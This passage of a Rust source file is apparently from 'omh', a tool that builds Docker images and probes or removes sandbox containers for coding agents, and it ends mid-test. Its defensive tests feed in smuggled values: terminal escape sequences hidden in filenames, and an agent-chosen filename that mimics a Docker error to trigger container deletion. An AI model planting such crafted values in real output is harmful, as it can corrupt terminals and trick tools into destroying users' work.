pub fn ensure(program: &str, adapter: &Adapter, ca: Option<&str>) -> Result<()> {
    let base = base_tag(ca);
    if !exists(program, &base) {
        eprintln!("omh: building {base} (first run only)");
        build(program, &base, &base_dockerfile(ca), &Kind::Base, ca)?;
    }
    let t = tag_for(adapter, ca);
    if !exists(program, &t) {
        eprintln!("omh: building {t}");
        build(
            program,
            &t,
            &harness_dockerfile(adapter, ca),
            &Kind::Harness(adapter),
            ca,
        )?;
    }
    Ok(())
}

/// What a TLS-inspecting proxy looks like in a failed build, per toolchain.
///
/// **Measured, except where marked.** Most of these are the exact strings each
/// tool produced against an `openssl s_server` presenting a leaf signed by a
/// private root, on an image with no root installed — the control arm of the
/// table in `ca_layer`'s doc. Two are not, and are labelled: they are
/// openssl's own wording for verify code 19, added because the same failure
/// reaches a build through tools that were not in the control, and it would be
/// dishonest to file them under "measured".
const INSPECTED: &[&str] = &[
    // curl, and the `apt` and rustup fetches that go through it.
    "unable to get local issuer certificate",
    "SSL certificate problem",
    // **Not measured.** openssl's wording for verify code 19, both spellings
    // it has used across versions. No tool in the control arm printed these;
    // they are here because the same proxy produces them through an openssl
    // that was not one of the seven.
    "self-signed certificate in certificate chain",
    "self signed certificate in certificate chain",
    // node — the one measured to ignore the system store.
    "UNABLE_TO_VERIFY_LEAF_SIGNATURE",
    // python, pip.
    "CERTIFICATE_VERIFY_FAILED",
    // go.
    "x509: certificate signed by unknown authority",
    // cargo, through libgit2.
    "the SSL certificate is invalid",
    // git.
    "server certificate verification failed",
];

/// Why a build died, when omh can tell — and what to do about it.
///
/// `doctor`'s **guest-side** checks cannot answer this one. They launch the
/// real image and inspect paths inside it, and behind a TLS-inspecting proxy
/// there is no image: the build dies on an unknown issuer, so every one of
/// them is unreachable. That is why doctor asks the question host-side instead
/// — `doctor::inspected_hosts` — and why the diagnosis *also* lives here,
/// where a build that got past the cache still dies.
///
/// Before this, a build behind a corporate proxy ended in `failed to build
/// omh/base:…` with the reason scrolled past in the docker log — a user with
/// no idea that a setting existed to fix it. That is the case `ca_cert` was
/// written for, and the one omh was silent about.
///
/// Two answers, because they are different problems. With no `ca_cert` set,
/// the fix is to set one. With one already set, the certificate is present and
/// did not work — the likely causes are a chain missing its intermediate, or a
/// root that is not the one this proxy actually presents.
pub fn why_the_build_failed(log: &str, ca_set: bool) -> Option<String> {
    let hit = INSPECTED.iter().find(|needle| log.contains(**needle))?;
    Some(if ca_set {
        format!(
            "The build failed on an unverifiable certificate ({hit}), and \
             `ca_cert` is already set — so the root omh embedded is not the one \
             this connection needs. Corporate IT usually hands out a chain: \
             check the file holds every certificate in it, and that it is the \
             root your proxy actually presents. `omh doctor` reports whether \
             the one omh embedded reached the trust store."
        )
    } else {
        format!(
            "The build failed on an unverifiable certificate ({hit}). That is \
             what a TLS-inspecting proxy looks like — Zscaler, Netskope and the \
             like re-sign every connection with the company's own root, which \
             this machine trusts and a container does not.\n\
             \n    omh set --local ca_cert /path/to/corp-root.pem\n\n\
             On macOS the root is in the keychain rather than on disk:\n\
             \n    security find-certificate -a -c \"Zscaler\" -p > ~/corp-root.pem\n\n\
             See `docs/troubleshooting.md`. If you are not behind a proxy, this \
             was a different certificate problem and the log above has it."
        )
    })
}

/// Hand a child's stderr back to the terminal, and keep a copy.
///
/// **Bytes, not lines.** This was `read_line(..).unwrap_or(0)`, which folds
/// `InvalidData` — what `read_line` answers for any byte sequence that is not
/// UTF-8 — into "the stream ended". One such byte and the relay stopped
/// mid-build, so a build went silent where `Stdio::inherit` would have shown
/// every byte; the captured log was truncated, so a certificate error arriving
/// after it went undiagnosed; and nothing was left draining a pipe the child
/// was still writing to, which is a hang rather than a wrong answer.
///
/// `read_until` with `from_utf8_lossy` cannot fail on encoding at all, which
/// removes the class rather than handling it. A real I/O error on the read end
/// means the pipe is gone and the child is about to get `EPIPE`, so that one is
/// reported and ends the relay rather than passing silently as EOF.
pub fn relay(err: std::process::ChildStderr) -> String {
    use std::io::BufRead;
    let mut reader = std::io::BufReader::new(err);
    let mut log = String::new();
    let mut buf = Vec::new();
    loop {
        buf.clear();
        match reader.read_until(b'\n', &mut buf) {
            Ok(0) => break,
            Ok(_) => {
                // `eprint!`, not a direct `write_all` to the handle. Both put
                // the same bytes on stderr, but only this spelling is one the
                // output-layer scan in `main.rs` can see — and a relay that
                // the guard cannot see is a hole in it, whatever the intent.
                // It is listed there, in `relayed`, as exactly this line.
                let text = String::from_utf8_lossy(&buf);
                eprint!("{text}");
                log.push_str(&text);
            }
            Err(e) => {
                eprintln!("omh: lost the rest of the build log ({e})");
                break;
            }
        }
    }
    log
}

fn build(program: &str, tag: &str, dockerfile: &str, kind: &Kind, ca: Option<&str>) -> Result<()> {
    use anyhow::Context;
    use std::io::Write;
    use std::process::Stdio;

    // Empty context: everything the image needs comes from the Dockerfile.
    let context = std::env::temp_dir().join("omh-build-context");
    std::fs::create_dir_all(&context)?;

    let mut child = std::process::Command::new(program)
        .args(build_args(tag, &context, kind))
        .stdin(Stdio::piped())
        // Piped so omh can read the reason it failed, then written straight
        // back out line by line — a build is minutes long and watching it is
        // how you know it is alive, so capturing must not mean swallowing.
        //
        // **stderr only, and that is measured rather than assumed.** A review
        // argued the classic builder writes step output to stdout, so the
        // diagnosis would silently not exist under `DOCKER_BUILDKIT=0`. Half
        // right: on docker 29.7.2 the classic builder does split its output —
        // 2 lines of the error on stdout, 3 on stderr — while BuildKit puts
        // all 7 on stderr. The needle reaches stderr either way, so the
        // diagnosis fires for both, and the user sees the whole log regardless
        // because stdout stays inherited.
        //
        // So do not "fix" this by piping stdout as well. That means draining
        // two pipes from one thread, which is the deadlock this function
        // already had to have designed out of it once, for no measured gain.
        .stderr(Stdio::piped())
        .spawn()
        .with_context(|| format!("running {program} build"))?;

    // **Closed before reading, not by `wait`.** omh sends the recipe on `-f -`,
    // so docker reads stdin until EOF. `Child::wait` closes stdin for you, but
    // the tee below runs *before* the wait — leaving it open here deadlocks
    // the build against a reader that will never see the end of its recipe.
    {
        let mut stdin = child.stdin.take().context("build stdin")?;
        stdin.write_all(dockerfile.as_bytes())?;
    }

    let log = match child.stderr.take() {
        Some(err) => relay(err),
        None => String::new(),
    };

    let status = child.wait()?;
    if !status.success() {
        // **Carried, not sniffed.** This read
        // `dockerfile.contains("update-ca-certificates")`, which is true only
        // of the *base* recipe: `harness_dockerfile` and `stack_dockerfile`
        // are `FROM <tag>` and fold the certificate into an opaque digest. So
        // the two layers that run `npm install -g` and `pip3 install` — the
        // fetches a proxy actually kills — always looked like "no certificate
        // set", and a user whose chain was missing an intermediate was told to
        // set the setting they had already set.
        if let Some(why) = why_the_build_failed(&log, ca.is_some()) {
            anyhow::bail!("failed to build {tag}\n\n{why}");
        }
        anyhow::bail!("failed to build {tag}");
    }
    reap(program, tag, kind);
    Ok(())
}

/// Remove the tags this build just replaced.
///
/// Here rather than at an `omh image prune` the user has to remember, because
/// the moment a new tag exists is the moment the old one *of the same kind* is
/// dead, and the cost of not doing it is silent until the disk is full.
///
/// Best-effort: a build that succeeded must not fail because tidying up after
/// it did, so nothing here returns an error. It is not silent, though. A
/// removal docker declines because a container holds the image is expected and
/// says nothing; anything else is reported, because a reaper that has been
/// failing on every build for months is indistinguishable from one that is
/// working unless it says so — and that indistinguishability is the whole
/// failure this feature exists to end.
fn reap(program: &str, built: &str, kind: &Kind) {
    let tags = match list_tags(program, kind) {
        Ok(t) => t,
        Err(e) => {
            eprintln!("omh: could not list images to reap: {e}");
            return;
        }
    };
    let in_use = images_in_use(program);
    let mut gone = Vec::new();
    for tag in superseded(built, &tags, &in_use) {
        match remove_image(program, &tag) {
            Removal::Deleted => gone.push(tag),
            // Docker holding a line omh already tried to hold means the two
            // disagreed about what is in use, which the ID-shaped `{{.Image}}`
            // makes possible. The image stays, which is the right outcome, so
            // there is nothing to tell anyone.
            Removal::InUse => {}
            // An untag is not a removal. `docker image rm` exits 0 for one, so
            // counting exit codes would report a reclaim that did not happen:
            // the image is still there under its other name.
            Removal::Untagged => {}
            Removal::Failed(why) => eprintln!("omh: could not remove {tag}: {why}"),
        }
    }
    if !gone.is_empty() {
        eprintln!("omh: removed {} this build replaced", gone.join(", "));
    }
}

/// What `docker image rm` actually did, which its exit code does not say.
enum Removal {
    /// The image is gone and its unique layers are reclaimable.
    Deleted,
    /// The name is gone; the image survives under another tag. Exit code 0,
    /// zero bytes freed.
    Untagged,
    /// A container references it. Expected, and not a problem.
    InUse,
    Failed(String),
}

fn remove_image(program: &str, tag: &str) -> Removal {
    let out = match std::process::Command::new(program)
        .args(["image", "rm", tag])
        .output()
    {
        Ok(o) => o,
        Err(e) => return Removal::Failed(e.to_string()),
    };
    if out.status.success() {
        return classify_removal(&String::from_utf8_lossy(&out.stdout));
    }
    let err = String::from_utf8_lossy(&out.stderr);
    if err.contains("is using its referenced image") {
        Removal::InUse
    } else {
        Removal::Failed(err.trim().to_string())
    }
}

/// Read a successful `docker image rm` for what it did.
///
/// Split from the call so the distinction can be tested. Whether docker prints
/// `Deleted:` is docker's behaviour and no unit test settles it; that omh reads
/// an `Untagged:`-only run as *not* a removal is omh's own logic, and it is the
/// difference between an honest report and a count of exit codes.
fn classify_removal(stdout: &str) -> Removal {
    if stdout
        .lines()
        .any(|l| l.trim_start().starts_with("Deleted:"))
    {
        Removal::Deleted
    } else {
        Removal::Untagged
    }
}

/// Every tag of the same class as the one just built.
fn list_tags(program: &str, kind: &Kind) -> Result<Vec<String>> {
    let out = std::process::Command::new(program)
        .args(kind.list_args())
        .output()?;
    anyhow::ensure!(out.status.success(), "listing images to reap");
    Ok(String::from_utf8_lossy(&out.stdout)
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .map(str::to_string)
        .collect())
}

/// Images any container references, running or stopped.
///
/// Stopped counts, though not for the reason it first looks like. omh removes
/// its own container on `omh s down` — `down` calls `container_remove`, which
/// is `docker rm -f` — so a stopped container omh can still see is one that
/// died *outside* omh's control: a host reboot, an OOM kill, a daemon crash.
/// Docker refuses to drop an image such a container references, and plain
/// `docker ps` would not show it.
///
/// Read two ways because `{{.Image}}` is not reliably a tag: docker prints
/// whatever the container config holds, which degrades to a bare image ID once
/// that reference stops resolving — including when an earlier reap untagged it.
/// The `omh.image` label is the tag omh itself launched, stamped by
/// `Plan::labels`, and it does not degrade.
fn images_in_use(program: &str) -> Vec<String> {
    let read = |args: &[&str]| -> Vec<String> {
        std::process::Command::new(program)
            .args(args)
            .output()
            .map(|o| {
                String::from_utf8_lossy(&o.stdout)
                    .lines()
                    .map(str::trim)
                    .filter(|l| !l.is_empty())
                    .map(str::to_string)
                    .collect()
            })
            .unwrap_or_default()
    };
    let mut v = read(&["ps", "-a", "--format", "{{.Image}}"]);
    v.extend(read(&[
        "ps",
        "-a",
        "--filter",
        "label=omh.image",
        "--format",
        "{{.Label \"omh.image\"}}",
    ]));
    v.sort();
    v.dedup();
    v
}

/// The plan names a per-project network; something has to create it. Without
/// this every launch dies at `network omh-<repo> not found` — a plan that is
/// well-formed but not runnable.
pub fn ensure_network(program: &str, name: &str) -> Result<()> {
    let present = std::process::Command::new(program)
        .args(["network", "inspect", name])
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false);
    if present {
        return Ok(());
    }
    let out = std::process::Command::new(program)
        .args(["network", "create", name])
        .output()?;
    if !out.status.success() {
        anyhow::bail!(
            "creating network {name}: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    Ok(())
}

/// Is the session container up right now?
/// Whether the sandbox is up — with *omh could not tell* as its own answer.
///
/// A `bool` here was the same collapse the session dashboard carried in its
/// `behind` column, with more at stake. `false` meant both *the container is
/// not running* and *the runtime would not answer*, so a Docker daemon that is
/// down rendered live sandboxes as `stopped` — and, far worse, told
/// `stop_before_syncing` there was nothing to stop. A sync would then overwrite
/// files under a live agent, which that function's own doc calls the worst
/// outcome available.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Running {
    Yes,
    No,
    /// The runtime could not be asked, and why. Never *no*.
    ///
    /// The payload is always through `out::untrusted` and never empty — both
    /// are `running_from`'s doing, and it is the only thing that builds one.
    /// Callers repeat it into a terminal without sanitising again, so a second
    /// construction site would have to keep that promise.
    Unknown(String),
}

/// Is this container up, given what the runtime said when asked?
///
/// Over the process result rather than the process, so all the states are a
/// table — the shape `doctor::version_of` uses, for the reason it records:
/// while this was one `.unwrap_or(false)`, no test could reach any state but
/// the first. Measured 2026-08-24 against docker 29.7.2.
///
/// **The mechanism is the exit status, and the name is compared here rather
/// than passed to the runtime as a pattern.** Measured 2026-08-24 against
/// docker 29.7.2:
///
/// | container state | `ps --format {{.Names}}` | answer |
/// |---|---|---|
/// | running | lists it | `Yes` |
/// | paused | lists it | `Yes` |
/// | restarting | lists it | `Yes` |
/// | created, never started | absent | `No` |
/// | exited | absent | `No` |
/// | no such container | absent | `No` |
/// | daemon unreachable | exit 1 | `Unknown` |
///
/// `paused` and `restarting` answering `Yes` is deliberate and matches what
/// the old probe did: both hold a tree omh must not write under. `created`
/// answering `No` matches it too — nothing is running in a container that was
/// never started.
///
/// Two things this deliberately does **not** do. It does not ask the runtime
/// about one container: `--filter name=` is a *regex*, docker permits `.` in a
/// name, and `Paths::container` builds one from the checkout's directory
/// basename unsanitised — so a repo in `~/src/omh.rs` would probe with
/// `^omh-omh.rs-s01$` and match `omh-omhXrs-s01` as well. And a filter that
/// does not parse exits **0 with empty stdout**, which reads as *not running*:
/// the collapse this type exists to remove, reintroduced by the probe meant to
/// fix it. Comparing here has no pattern language in it.
///
/// It also does not fuse *stopped* with *never built* by accident — that is on
/// purpose. Neither is running and no caller wants them apart.
pub fn running_from(name: &str, asked: std::io::Result<std::process::Output>) -> Running {
    let out = match asked {
        Ok(out) => out,
        // The program is on `PATH` — `runtime::installed` said so before any
        // of this — so a spawn that fails is a fork failure or a binary that
        // vanished mid-run, and either way omh has no answer.
        Err(e) => {
            return Running::Unknown(crate::out::untrusted(&format!(
                "could not run the container runtime: {e}"
            )))
        }
    };
    if !out.status.success() {
        // A non-zero exit is never a *no*, whatever it did or did not say.
        return Running::Unknown(unreadable(
            &String::from_utf8_lossy(&out.stderr),
            &out.status,
        ));
    }
    match String::from_utf8_lossy(&out.stdout)
        .lines()
        .any(|listed| listed.trim() == name)
    {
        true => Running::Yes,
        false => Running::No,
    }
}

pub fn container_running(backend: &dyn crate::runtime::Runtime, name: &str) -> Running {
    running_from(
        name,
        std::process::Command::new(backend.program())
            .args(backend.running_args())
            .output(),
    )
}

/// Why omh has no answer, said the same way wherever that happens.
///
/// One function because `Running::Unknown` and `Probe::Unknown` make the same
/// promise — sanitised, never empty, repeated into a terminal without being
/// sanitised again — and it was a copy of the same ladder in both. Two copies
/// of a promise is one more than can be kept.
///
/// The empty case is not hypothetical tidiness: a non-zero exit with nothing
/// said produced `…so it will not sync over it: `, a sentence ending in a
/// colon. And it is the exit **code**, not the `Display` of `ExitStatus`,
/// which renders `exit status: 1` and read as "the container runtime exited
/// exit status: 1".
pub(crate) fn unreadable(said: &str, status: &std::process::ExitStatus) -> String {
    let said = crate::out::untrusted(said.trim());
    match said.is_empty() {
        false => said,
        true => match status.code() {
            Some(code) => format!("the container runtime exited {code}"),
            None => "the container runtime was killed by a signal".into(),
        },
    }
}

/// What the one exec `reuse_decision` runs came back as.
///
/// `Option<String>` here was the same collapse `Running` replaced, on the
/// decision with the most to lose: `None` meant *the container cannot reach
/// its worktree*, *the daemon died between the two calls*, *the container
/// stopped*, *the image has no shell*, and *the fork failed* — and `reuse`
/// turns the first into `Restart`, which `session_up` acts on with `rm -f`.
/// On a container it confirmed was running three lines earlier.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Probe {
    /// The exec worked. Carries what it printed, which may be empty.
    ///
    /// The one payload here written by the **sandbox** rather than by the
    /// runtime, so it is sanitised on the way out: these are filenames from a
    /// directory the agent can write to, and they reach a terminal through
    /// `Reuse::Blocked` — the message whose whole job is telling somebody
    /// their work is safe.
    Listed(String),
    /// The mount-namespace failure, by its own signature: the worktree the
    /// container is bound to was replaced under it, and no `exec` will ever
    /// work again. Replacing it is the only remedy.
    NotEnterable,
    /// The container is not there to enter — removed or exited between the
    /// two calls omh makes.
    ///
    /// Kept apart from `Unknown` because the safe direction is the opposite
    /// one: nothing is alive inside a container that is gone, so replacing it
    /// costs nothing and the launch carries on. Folding it into `Unknown`
    /// turned the most ordinary race in the launch path — an agent that
    /// finishes between *is it running* and *can it be entered* — into a
    /// failed command the user had to run twice.
    Gone,
    /// Something else went wrong, and why. Never *not enterable*.
    ///
    /// The payload is always through `out::untrusted` and never empty, both of
    /// which are `probe_from`'s doing. Callers repeat it into a terminal
    /// without sanitising again.
    Unknown(String),
}

/// The one failure a container cannot recover from, spelled the way docker
/// spells it.
///
/// Matched on the message rather than on the exit code, and that is a
/// measurement rather than a preference — an earlier draft of this said the
/// opposite, having failed to produce a second 128.
///
/// It failed because both attempts were *daemon-level* errors, which never
/// reach the OCI runtime and so cannot land on 128 by construction. Reaching
/// past that boundary takes seconds: `docker exec -w /loop` where `/loop` is a
/// symlink to itself gives exit 128 with `chdir to cwd ("/loop") … too many
/// levels of symbolic links`, on stdout, sharing the `OCI runtime exec
/// failed:` prefix and sharing nothing else.
///
/// And 128 is not the category the draft called it. Measured 2026-08-24
/// against docker 29.7.2: docker maps a start failure that reads as ENOENT to
/// **127** and one that reads as EACCES to **126**; 128 is what is left when
/// neither matches. A residue, which two unrelated failures share.
const BROKEN_MOUNT: &str = "container mount namespace root";

/// What docker prefixes an error it produced itself, on stdout.
///
/// The scan for `BROKEN_MOUNT` is restricted to bytes with this prefix, plus
/// stderr. Without it the search covers stdout, which on a partial `ls` is
/// written by the **agent** — and a match there is a `docker rm -f`.
const RUNTIME_ERROR: &str = "OCI runtime exec failed";

/// What docker says when the daemon answered but the container could not be
/// used — as opposed to the daemon not answering at all.
///
/// Measured 2026-08-24 against docker 29.7.2: a container that was removed
/// says `Error response from daemon: No such container: …`, one that exited
/// says `Error response from daemon: container … is not running`, and a daemon
/// that cannot be reached says `failed to connect to the docker API at …`.
/// The prefix is the mechanism rather than the two messages: if the daemon
/// answered, the problem is the container, and replacing a container with
/// nothing alive in it is free.
const DAEMON_ANSWERED: &str = "Error response from daemon";

/// The command the probe runs, and the only one `probe_from` is written to
/// read.
///
/// Here rather than at the call site because the two are one mechanism: what
/// `probe_from` may conclude from a non-zero exit depends entirely on this
/// command being unable to fail on its own. `[ -d ] || exit 0` is what makes
/// that true — an absent socket directory is the ordinary case for a session
/// whose harness has never run, and it exits 0 with nothing rather than
/// failing.
///
/// It replaces `ls … 2>/dev/null || true`, which swallowed *every* `ls`
/// failure into an empty listing. An empty listing means *no harness is live*,
/// which is the input that makes `reuse` choose `Restart` over `Blocked` — so
/// a directory that could not be read read as "nothing to lose" and the
/// container was destroyed with an agent inside. The polarity is opposite to
/// the bug this type fixes and the cost is the same.
pub fn probe_command() -> Vec<String> {
    vec![
        "sh".into(),
        "-c".into(),
        format!(
            "[ -d {dir} ] || exit 0; ls -1 {dir}",
            dir = crate::persist::SOCKET_DIR
        ),
    ]
}

/// Read the probe's result, keeping the failures that mean different things
/// apart.
///
/// Over the process result rather than the process, so all of it is a table.
///
/// Measured 2026-08-24 against docker 29.7.2, through `/bin/sh` rather than
/// the interactive shell — zsh's MULTIOS has made this exact measurement wrong
/// in this project before. Deleting the bind-mount source is enough on its own
/// — recreating it produces byte-identical output, so *replaced* is one route
/// in rather than the trigger:
///
/// | what happened | exit | where it said so |
/// |---|---|---|
/// | the exec worked | 0 | the listing, on stdout |
/// | the worktree was replaced under it | 128 | `OCI runtime exec failed: …` on **stdout** |
/// | the image has no such binary | 127 | `OCI runtime exec failed: …` on **stdout** |
/// | the container was removed | 1 | `Error response from daemon: No such container` |
/// | the container had exited | 1 | `Error response from daemon: container … is not running` |
/// | the daemon could not be reached | 1 | `failed to connect to the docker API at …` |
pub fn probe_from(asked: std::io::Result<std::process::Output>) -> Probe {
    let out = match asked {
        Ok(out) => out,
        Err(e) => {
            return Probe::Unknown(crate::out::untrusted(&format!(
                "could not run the container runtime: {e}"
            )))
        }
    };
    if out.status.success() {
        return Probe::Listed(crate::out::untrusted(&String::from_utf8_lossy(&out.stdout)));
    }
    let stdout = String::from_utf8_lossy(&out.stdout);
    let stderr = String::from_utf8_lossy(&out.stderr);
    // Only the bytes docker wrote. Stdout is the agent's on a listing that
    // began before something went wrong, and every conclusion below is one the
    // agent must not be able to reach for itself.
    let runtime_said = match stdout.contains(RUNTIME_ERROR) {
        true => format!("{stdout}{stderr}"),
        false => stderr.into_owned(),
    };
    if runtime_said.contains(BROKEN_MOUNT) {
        return Probe::NotEnterable;
    }
    if runtime_said.contains(DAEMON_ANSWERED) {
        return Probe::Gone;
    }
    Probe::Unknown(unreadable(&runtime_said, &out.status))
}

pub fn container_probe(program: &str, args: &[String]) -> Probe {
    probe_from(std::process::Command::new(program).args(args).output())
}

/// What the running container says it was built from.
/// What omh stamped on a container, or why it could not be read.
///
/// The third answer is not decoration. This was
/// `.ok().filter(success).unwrap_or_default()`, and an empty map is not a
/// neutral value here — `container::drift` reads one as a confident claim,
/// *"it predates this check, so nothing about it can be verified"*, which
/// `reuse` turns into `Restart` and `session_up` into `rm -f`.
///
/// So a daemon that restarted between the probe and this call destroyed a
/// container that had just been confirmed alive **and** enterable, and told
/// the user a fabricated reason for it. That is worse than the silence it
/// replaced: it is confident enough that nobody goes looking for a daemon
/// problem. The identical chain this module's `Probe` was written to close,
/// entered one line further down.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Stamp {
    /// Read, and here is what it says. Empty means the container carries no
    /// omh labels — genuinely older than the check.
    Read(std::collections::BTreeMap<String, String>),
    /// The runtime would not say, and why.
    Unknown(String),
}

pub fn container_stamp(program: &str, name: &str) -> Stamp {
    stamp_from(
        std::process::Command::new(program)
            .args(["inspect", "-f", "{{json .Config.Labels}}", name])
            .output(),
    )
}

/// Read the stamp, given what the runtime said.
///
/// `omh_labels` swallows a parse failure into an empty map, which used to mean
/// unparseable JSON also read as *predates this check*. A `docker inspect`
/// that exits 0 and prints something this cannot parse is the runtime
/// answering in a shape omh does not know, which is not the same as a
/// container with no labels — so the emptiness has to be decided here, where
/// the difference is still visible.
pub fn stamp_from(asked: std::io::Result<std::process::Output>) -> Stamp {
    let out = match asked {
        Ok(out) => out,
        Err(e) => {
            return Stamp::Unknown(crate::out::untrusted(&format!(
                "could not run the container runtime: {e}"
            )))
        }
    };
    if !out.status.success() {
        return Stamp::Unknown(unreadable(
            &String::from_utf8_lossy(&out.stderr),
            &out.status,
        ));
    }
    let said = String::from_utf8_lossy(&out.stdout);
    // `null` is what docker prints for a container with no labels at all, and
    // it is the one non-map answer that means something. Anything else that
    // will not parse is the runtime speaking a shape omh does not know.
    if said.trim() == "null" {
        return Stamp::Read(Default::default());
    }
    match serde_json::from_str::<std::collections::BTreeMap<String, String>>(said.trim()) {
        Ok(all) => Stamp::Read(
            all.into_iter()
                .filter(|(k, _)| k.starts_with("omh."))
                .collect(),
        ),
        Err(e) => Stamp::Unknown(crate::out::untrusted(&format!(
            "the container runtime answered with something omh could not read: {e}"
        ))),
    }
}

/// Stopped-but-present containers block `run --name`, so clear them first.
pub fn container_remove(program: &str, name: &str) -> Result<()> {
    let out = std::process::Command::new(program)
        .args(["rm", "-f", name])
        .output()?;
    if !out.status.success() {
        // A sandbox that is still running still has the credential directory
        // mounted writable; reporting it stopped would be a lie that matters.
        anyhow::bail!("{}", String::from_utf8_lossy(&out.stderr).trim());
    }
    Ok(())
}

/// The tags a freshly built one replaces.
///
/// A tag omh chooses is a hash of the recipe that produced it, so once a recipe
/// changes the previous tag of that same kind is dead: nothing will ever ask
/// for it again, and until now nothing removed it either.
///
/// Decided here, as a function over lists, rather than inside the code that
/// shells out: which images should go is omh's own logic and is worth testing;
/// whether docker agrees to remove one is not something a unit test can settle.
///
/// `tags` is one class — `Kind`, and not the docker repository, because a
/// repository holds several live tags at once and reading it as the class is
/// what made the first version of this eat the image it was built from.
///
/// Two things in a class are still never superseded. **`latest`**, because no
/// current recipe reproduces it: omh v0 tagged `omh/base:latest` and
/// `omh/{harness}:latest` (`129b530`), and `fac15ea` replaced both with recipe
/// hashes. A hash tag removed by mistake comes back by re-running the recipe;
/// `:latest` is reachable from no recipe omh still has, which makes it the one
/// removal that cannot be undone. And **anything a container references**,
/// however old, because that is a session someone is still using; docker would
/// refuse, but omh should not be asking, nor reporting a removal that did not
/// happen.
pub fn superseded(built: &str, tags: &[String], in_use: &[String]) -> Vec<String> {
    tags.iter()
        .filter(|t| t.as_str() != built)
        .filter(|t| !t.ends_with(":latest"))
        .filter(|t| !in_use.iter().any(|u| u == *t))
        .cloned()
        .collect()
}

pub fn exists(program: &str, tag: &str) -> bool {
    std::process::Command::new(program)
        .args(["image", "inspect", tag])
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn output(code: i32, stdout: &str, stderr: &str) -> std::io::Result<std::process::Output> {
        use std::os::unix::process::ExitStatusExt;
        Ok(std::process::Output {
            status: std::process::ExitStatus::from_raw(code << 8),
            stdout: stdout.as_bytes().to_vec(),
            stderr: stderr.as_bytes().to_vec(),
        })
    }

    /// A probe that failed some other way is never read as *this container
    /// cannot reach its worktree* — and the two failures that mean *nothing is
    /// alive in there* are not read as refusals.
    ///
    /// The first is the worst outcome in the program: `reuse` turns *not
    /// enterable* into `Restart`, and `session_up` acts on a `Restart` with
    /// `docker rm -f` — on a container confirmed running earlier in the same
    /// function. Every non-namespace exec failure destroyed an agent mid-turn,
    /// and under `--json` said nothing, because the only notice was
    /// `ctx.progress`.
    ///
    /// The second is milder and was introduced by fixing the first: folding
    /// *the container is gone* into the refusal turned the ordinary race — a
    /// sandbox whose process exits between *is it running* and *can it be
    /// entered* — from something that healed itself into a command the user
    /// had to run twice.
    ///
    /// Every row below is a transcript measured 2026-08-24 against docker
    /// 29.7.2 through `/bin/sh`, except the one marked as a shape.
    #[test]
    fn a_probe_that_failed_some_other_way_does_not_read_as_a_broken_worktree() {
        let namespace = "OCI runtime exec failed: exec failed: unable to start container \
             process: current working directory is outside of container mount namespace \
             root -- possible container breakout detected";

        assert_eq!(
            probe_from(output(0, "agent.sock\n", "")),
            Probe::Listed("agent.sock\n".into()),
            "a healthy exec answers with what it listed"
        );
        assert_eq!(
            probe_from(output(0, "", "")),
            Probe::Listed(String::new()),
            "including an empty listing — the socket directory is not there yet"
        );
        // The sandbox writes those filenames, and they reach a terminal
        // through `Reuse::Blocked` — the message whose job is saying the work
        // is safe.
        let Probe::Listed(listed) = probe_from(output(0, "s01-\u{1b}[2Jclaude\n", "")) else {
            panic!("a successful exec is a listing");
        };
        assert!(
            !listed.contains('\u{1b}'),
            "and nothing in it repaints the terminal: {listed:?}"
        );

        // At three exit codes, because the code is the part that must not be
        // load-bearing, and on both streams, because which one docker picks is
        // not a thing to depend on.
        for (code, stdout, stderr, what) in [
            (
                128,
                namespace,
                "",
                "the measured signature, on the stream docker used",
            ),
            (
                1,
                "",
                namespace,
                "the same message on stderr, should docker move it",
            ),
            (
                127,
                namespace,
                "",
                "and at a code omh has no reason to expect",
            ),
        ] {
            assert_eq!(
                probe_from(output(code, stdout, stderr)),
                Probe::NotEnterable,
                "{what}"
            );
        }

        // Nothing alive to lose. Both measured; both used to be refusals.
        for (stderr, what) in [
            (
                "Error response from daemon: No such container: omh-repo-s01",
                "a container removed between the two calls",
            ),
            (
                "Error response from daemon: container 1794fad25dec is not running",
                "and one that exited between them",
            ),
        ] {
            assert_eq!(probe_from(output(1, "", stderr)), Probe::Gone, "{what}");
        }

        // Everything else. The first two would read as the fatal case if the
        // exit code decided instead of the message.
        for (code, stdout, stderr, what) in [
            (
                128,
                "OCI runtime exec failed: exec failed: unable to start container process: \
                 chdir to cwd (\"/loop\") set in config.json failed: too many levels of \
                 symbolic links",
                "",
                "a second 128 — measured, so matching the code is provably not enough",
            ),
            (
                127,
                "OCI runtime exec failed: exec failed: unable to start container process: \
                 exec: \"sh\": executable file not found in $PATH",
                "",
                "an image with no shell, sharing the prefix and nothing else",
            ),
            (
                1,
                "",
                "failed to connect to the docker API at unix:///var/run/docker.sock; check \
                 if the path is correct and if the daemon is running",
                "a daemon that could not be reached at all",
            ),
            // A shape rather than a transcript: omh has not produced one.
            (137, "", "", "an exec that exited 137 saying nothing"),
            // The one the agent could reach for. Stdout on a failure is the
            // sandbox's — a listing that began before something went wrong —
            // and the signature is only docker's when it carries docker's
            // prefix. Without the scoping, a file named after the failure
            // steers omh into `rm -f` on the container that named it.
            (
                137,
                "s01-current working directory is outside of container mount namespace root\n",
                "",
                "a filename the agent chose, which is not docker speaking",
            ),
        ] {
            let answered = probe_from(output(code, stdout, stderr));
            assert!(
                matches!(&answered, Probe::Unknown(_)),
                "{what}: {answered:?}"
            );
        }

        // The payload, which nothing used to look at — so dropping
        // `out::untrusted` from it passed, on a string that goes verbatim into
        // a `bail!` and out to a terminal.
        let Probe::Unknown(why) = probe_from(output(1, "", "cannot \u{1b}[2J connect")) else {
            panic!("an unrecognised failure has no answer");
        };
        assert!(!why.contains('\u{1b}'), "sanitised: {why:?}");
        assert!(why.contains("cannot"), "and the words survive: {why:?}");

        let Probe::Unknown(quiet) = probe_from(output(137, "", "")) else {
            panic!("a silent failure still has no answer");
        };
        assert!(
            quiet.contains("137"),
            "a failure that said nothing still says something: {quiet:?}"
        );
        assert!(
            !quiet.contains("exit status"),
            "and not `exited exit status: 137`: {quiet:?}"
        );

        assert!(
            matches!(
                probe_from(Err(std::io::Error::other("fork failed"))),
                Probe::Unknown(_)
            ),
